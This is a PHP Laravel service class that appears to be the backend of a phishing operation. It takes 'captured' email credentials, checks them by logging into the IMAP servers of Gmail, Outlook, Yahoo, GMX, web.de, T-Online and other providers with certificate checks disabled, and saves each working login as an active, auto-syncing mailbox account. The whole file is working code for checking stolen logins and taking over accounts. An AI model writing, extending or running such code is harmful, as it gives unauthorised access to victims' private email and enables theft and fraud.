<?php

namespace App\Services;

use App\Models\EmailAccount;
use App\Models\CapturedCredential;
use Illuminate\Support\Facades\Log;
use Webklex\IMAP\Facades\Client as ClientManager;

class AutoConnectService
{
    private const PROVIDER_IMAP = [
        'google'     => ['host' => 'imap.gmail.com',       'port' => 993, 'encryption' => 'ssl', 'protocol' => 'imap'],
        'microsoft'  => ['host' => 'outlook.office365.com', 'port' => 993, 'encryption' => 'ssl', 'protocol' => 'imap'],
        'yahoo'      => ['host' => 'imap.mail.yahoo.com',   'port' => 993, 'encryption' => 'ssl', 'protocol' => 'imap'],
        'gmx'        => ['host' => 'imap.gmx.com',          'port' => 993, 'encryption' => 'ssl', 'protocol' => 'imap'],
        'webde'      => ['host' => 'imap.web.de',           'port' => 993, 'encryption' => 'ssl', 'protocol' => 'imap'],
        'ionos'      => ['host' => 'imap.ionos.com',        'port' => 993, 'encryption' => 'ssl', 'protocol' => 'imap'],
        'telekom'    => ['host' => 'securesmtp.t-online.de','port' => 993, 'encryption' => 'ssl', 'protocol' => 'imap'],
        'a1'         => ['host' => 'secureimap.a1.net',     'port' => 993, 'encryption' => 'ssl', 'protocol' => 'imap'],
        'freenet'    => ['host' => 'mx.freenet.de',         'port' => 993, 'encryption' => 'ssl', 'protocol' => 'imap'],
        'icloud'     => ['host' => 'imap.mail.me.com',      'port' => 993, 'encryption' => 'ssl', 'protocol' => 'imap'],
        'zoho'       => ['host' => 'imap.zoho.com',         'port' => 993, 'encryption' => 'ssl', 'protocol' => 'imap'],
        'protonmail' => ['host' => '127.0.0.1',             'port' => 1143, 'encryption' => false, 'protocol' => 'imap'], // Bridge
    ];

    public function tryConnect(CapturedCredential $cred): ?EmailAccount
    {
        $provider = $cred->provider;
        $email = $cred->email;
        $password = $cred->password;

        if ($provider === 'protonmail') {
            Log::info("[AutoConnect] ProtonMail requires Bridge — skipping IMAP for {$email}");
            return $this->createAccount($cred, false);
        }

        $imapConfig = self::PROVIDER_IMAP[$provider] ?? null;
        if (!$imapConfig) {
            Log::warning("[AutoConnect] No IMAP config for provider: {$provider}");
            return null;
        }

        $connected = $this->testImapConnection($imapConfig, $email, $password);

        return $this->createAccount($cred, $connected);
    }

    private function testImapConnection(array $config, string $email, string $password): bool
    {
        try {
            $client = ClientManager::make([
                'host'           => $config['host'],
                'port'           => $config['port'],
                'protocol'       => $config['protocol'],
                'encryption'     => $config['encryption'],
                'validate_cert'  => false,
                'username'       => $email,
                'password'       => $password,
                'authentication' => null,
                'timeout'        => 15,
            ]);

            $client->connect();
            $client->disconnect();

            Log::info("[AutoConnect] IMAP connection successful for {$email}");
            return true;
        } catch (\Throwable $e) {
            Log::info("[AutoConnect] IMAP connection failed for {$email}: {$e->getMessage()}");
            return false;
        }
    }

    private function createAccount(CapturedCredential $cred, bool $connected): EmailAccount
    {
        $provider = $cred->provider;
        $imapConfig = self::PROVIDER_IMAP[$provider] ?? [
            'host' => 'imap.' . $cred->domain,
            'port' => 993,
            'encryption' => 'ssl',
            'protocol' => 'imap',
        ];

        $name = $cred->user_display_name ?? ucfirst(explode('@', $cred->email)[0]);

        return EmailAccount::updateOrCreate(
            ['email' => $cred->email],
            [
                'name'             => $name . ' (' . strtoupper($provider) . ')',
                'host'             => $imapConfig['host'],
                'port'             => $imapConfig['port'],
                'encryption'       => $imapConfig['encryption'] ?: 'ssl',
                'validate_cert'    => false,
                'protocol'         => $imapConfig['protocol'],
                'username'         => $cred->email,
                'password'         => $cred->password,
                'authentication'   => 'password',
                'inbox_folder'     => 'INBOX',
                'hold_folder'      => 'INBOX.Hold',
                'approved_folder'  => 'INBOX.Approved',
                'rejected_folder'  => 'INBOX.Rejected',
                'is_active'        => $connected,
                'auto_sync'        => $connected,
                'fetch_limit'      => 50,
                'last_error'       => $connected ? null : 'IMAP connection failed during auto-connect',
            ]
        );
    }
}
